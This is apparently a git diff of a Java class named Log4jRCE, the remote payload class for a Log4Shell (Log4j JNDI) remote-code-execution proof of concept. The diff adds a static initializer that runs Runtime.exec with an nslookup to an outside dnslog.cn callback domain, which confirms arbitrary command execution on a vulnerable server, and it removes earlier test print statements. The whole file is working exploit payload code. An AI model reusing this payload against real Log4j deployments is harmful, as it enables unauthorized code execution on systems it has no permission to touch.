@@ -1,16 +1,15 @@
+import java.io.IOException;
+
+/**
+ * @author Cosmos E-mail: liucy@csxbank.com
+ * @date 2021/12/10 10:03
+ **/
 public class Log4jRCE {
-
     static {
-        System.out.println("I am Log4jRCE from remote!!!");
-//        try {
-//            String[] cmd = {"code"};
-//            java.lang.Runtime.getRuntime().exec(cmd).waitFor();
-//        } catch (Exception e) {
-//            e.printStackTrace();
-//        }
-    }
-
-    public Log4jRCE(){
-        System.out.println("I am Log4jRCE from remote222!!!");
+        try {
+            Runtime.getRuntime().exec("nslookup fqgrdf.dnslog.cn");
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
     }
 }
